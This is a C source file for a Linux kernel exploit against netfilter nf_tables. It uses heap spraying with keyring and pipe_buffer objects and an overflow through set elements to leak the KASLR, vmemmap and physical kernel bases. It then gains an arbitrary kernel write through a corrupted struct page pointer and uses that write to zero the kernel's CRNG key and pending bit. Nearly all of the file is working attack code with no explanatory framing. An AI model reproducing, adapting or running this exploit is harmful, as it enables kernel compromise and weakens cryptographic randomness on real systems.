#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/netlink.h>
#include <fcntl.h> // Added for debugging pipe only

#include "log.h"
#include "util.h"
#include "keyring.h"
#include "nf_tables.h"
#include "pipe_buffer.h"
#include "libprimitive.h"

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE_NAME "table\0\0"

#define SPRAY_SIZE  300
#define PAGE_SIZE   4096
#define DATA_SIZE   PAGE_SIZE / 8

static void exploit_setup(exploit_context *ctx) {
    //=========================================================================
    // SETUP
    //=========================================================================

    /* Pin the process to the first CPU */
    set_cpu_affinity(0, 0);

    new_ns();
    printf("[+] Get CAP_NET_ADMIN capability\n");

    raise_rlimit(RLIMIT_NOFILE);

    /* Netfilter netlink socket creation */
    if ((ctx->sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0)
        do_error_exit("socket");
    printf("[+] Netlink socket created\n");

    struct sockaddr_nl snl;
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(ctx->sock, (struct sockaddr *)&snl, sizeof(snl)) < 0)
        do_error_exit("bind");
    printf("[+] Netlink socket bound\n");

    /* Create a netfilter table */
    create_table(ctx->sock, TABLE_NAME);
    printf("[+] Table %s created\n", TABLE_NAME);

    /* Create a netfilter set for the info leak */
    create_set(ctx->sock, LEAK_SET_NAME, KMALLOC64_KEYLEN,
            sizeof(struct keyring_payload), TABLE_NAME, ID);
    printf("[+] Set for the leak created\n");

    /*  Create a netfilter set for the pipe_buffer primitive */
    create_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN,
            sizeof(struct pipe_buffer_payload), TABLE_NAME, ID + 1);
    printf("[+] Set for write primitive created\n");
}

static void leak_kernel_virtual_base_and_vmemmap_base(exploit_context *ctx) {
    //=========================================================================
    // LEAK KERNEL VIRTUAL BASE AND VMEMMAP BASE
    //=========================================================================

    /* Prepare the payload for the leak */
    memset(&ctx->leak_payload, 0, sizeof(struct keyring_payload));
    ctx->leak_payload.len = USHRT_MAX;

    /* Initialize tries counter * id buffer*/
    unsigned long tries = 0;
    key_serial_t *id_buffer;

    printf("[*] Leak #1 in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        tries++;

        /* Spray heap with user_key_payload structs to perform an info leak */ 
        id_buffer = spray_keyring(SPRAY_KEY_SIZE);

        /** Perform the overflow to modify the size of a registered key **/
        add_elem_to_set(ctx->sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                sizeof(struct keyring_payload), (uint8_t *)&ctx->leak_payload);

        /* Spray the heap with struct pipe_buffer */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        /* Check if the overflow occured on the right object */
        ctx->leak = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE);
        if (!ctx->leak) {
            release_keys(id_buffer, SPRAY_KEY_SIZE);
            release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
            continue;
        }

        /* Success! */
        break;
    }
    printf("[+] Leak succeed after %lu tries\n", tries);
    printf("[+] kaslr base = 0x%lx\n", ctx->leak->kaslr_base);
    printf("[+] vmemmap base = 0x%lx\n", ctx->leak->vmemmap_base);
    printf("[+] base_crng = 0x%lx\n", ctx->leak->base_crng);
    printf("[+] pending_bit = 0x%lx\n", ctx->leak->pending_bit);

    /* Cleanup */
    release_keys(id_buffer, SPRAY_KEY_SIZE);
    release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
}

static void leak_kernel_physical_base(exploit_context *ctx) {
    //=========================================================================
    // LEAK KERNEL PHYSICAL BASE
    //=========================================================================

    /* Prepare the payload for leaking the kernel physical base address */
    memset(&ctx->payload, 0, sizeof(struct pipe_buffer_payload));
    long cur_paddr;
    cur_paddr = PHYSICAL_START;
    ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, cur_paddr);
    ctx->payload.len  = 16 /* bytes */;

    /* Initialize tries counter */
    unsigned long tries = 0;

    printf("[*] Leak #2 in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        tries++;

        /* Spray heap to find the physical base address of the kernel image */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        add_elem_to_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                sizeof(struct pipe_buffer_payload), (uint8_t *)&ctx->payload);

        /* Check if we found the physical kernel base address */
        ctx->kaslr_phys_base = get_phys_base(SPRAY_SIZE, ctx->pipe_buffer, cur_paddr);
        if (!ctx->kaslr_phys_base) {
            /*
             * Note: we don't release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer)
             * here to prevent the kernel from crashing since we modify the
             * struct page pointer.
             */ 
            if (tries % 10 == 0) {
                cur_paddr += INCREMENT_SIZE;
                ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, cur_paddr);
            }
            continue;
        }

        /* Success! */
        break;
    }
    printf("[+] Leak successful after %lu tries\n", tries);
    printf("[+] physical kernel address = 0x%lx\n", ctx->kaslr_phys_base);
}

static void get_arbitrary_write(exploit_context *ctx) {
    //=========================================================================
    // GET ARBITRARY WRITE
    //=========================================================================

    /* Initialize tries counter */
    unsigned long tries = 0;

    printf("[*] Struct page overwrite in progress\n");
    fflush(stdout);

    while (1) {
        /* Increment number of tries */
        tries++;

        /* Spray heap to find the physical base address of the kernel image */
        ctx->pipe_buffer = calloc(SPRAY_SIZE, sizeof(struct pipe));
        if (!ctx->pipe_buffer)
            do_error_exit("calloc");
        spray_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);

        add_elem_to_set(ctx->sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME, ID,
                sizeof(struct pipe_buffer_payload), (uint8_t *)&ctx->payload);

        /* Find the pipe that we overwrote the struct page of */
        ctx->victim_pipe = get_victim_pipe(SPRAY_SIZE, ctx->pipe_buffer);
        if (!ctx->victim_pipe) {
            release_pipe_buffer(SPRAY_SIZE, ctx->pipe_buffer);
            continue;
        }

        fcntl(ctx->victim_pipe->write, F_GETPIPE_SZ);

#ifdef LEAK_PAGE
        int i;
        uint64_t data[DATA_SIZE];
        uint64_t addr;
        if ((read(ctx->victim_pipe->read, data, PAGE_SIZE)) == -1)
            do_error_exit("read(ctx->victim_pipe)");

        printf("[+] Data:\n");
        for (i = 0; i < DATA_SIZE; i+=2) {
            addr = (ctx->leak->pending_bit & ~0xfffUL) + (i * 8);

            /* Add some highlighting to non-zero lines */
            if (data[i] != 0x0 || data[i + 1] != 0x0) {
                printf("\e[0;30;102m[0x%016lx] 0x%016lx 0x%016lx\e[m\n",
                        addr, data[i], data[i + 1]);
            } else {
                printf("[0x%016lx] 0x%016lx 0x%016lx\n",
                        addr, data[i], data[i + 1]);
            }
        }
#endif

        break;
    }
}

static void use_arbitrary_write(exploit_context *ctx) {
    if ((write(ctx->victim_pipe->write, ctx->zap_buf, ctx->zap_buf_size)) == -1)
        do_error_exit("write(ctx->victim_pipe)\n");
}

void trigger_overwrite_of_l1_key(struct exploit_context *ctx) {
    // Prepare the overwrite payload 
    ctx->zap_buf_size = BASE_CRNG_ZAP_SIZE;
    ctx->zap_buf = malloc(ctx->zap_buf_size);
    memset(ctx->zap_buf, 0, ctx->zap_buf_size);

    // Prepare the victim pipe payload 
    memset(&ctx->payload, 0, sizeof(struct pipe_buffer_payload));
    ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, ctx->kaslr_phys_base) +
        ((BASE_CRNG_OFFSET >> 12) * STRUCT_PAGE_SIZE);
    ctx->payload.len  = (ctx->leak->base_crng & 0xfffUL);

    // Perform overwrite 
    get_arbitrary_write(ctx);
    use_arbitrary_write(ctx);
}

void set_up_overwrite_of_pending_bit(struct exploit_context *ctx) {
    // Prepare the victim pipe payload 
    memset(&ctx->payload, 0, sizeof(struct pipe_buffer_payload));
    ctx->payload.page = (void *)paddr_to_page(ctx->leak->vmemmap_base, ctx->kaslr_phys_base) +
        ((PENDING_BIT_OFFSET >> 12) * STRUCT_PAGE_SIZE);
    ctx->payload.len  = (ctx->leak->pending_bit & 0xfffUL);

    // Obtain victim pipe 
    get_arbitrary_write(ctx);
}

void trigger_overwrite_of_pending_bit(struct exploit_context *ctx) {
    /* Prepare payload for arbitrary write */
    //ctx->zap_buf_size = PENDING_BIT_ZAP_SIZE;
    //ctx->zap_buf = malloc(ctx->zap_buf_size);
    //memset(ctx->zap_buf, 3, ctx->zap_buf_size);

    use_arbitrary_write(ctx);
}

struct exploit_context *setup() {
    exploit_context *ctx = malloc(sizeof(*ctx));
    memset(ctx, 0, sizeof(*ctx));

    exploit_setup(ctx);
    leak_kernel_virtual_base_and_vmemmap_base(ctx);
    leak_kernel_physical_base(ctx);

    return ctx;
}
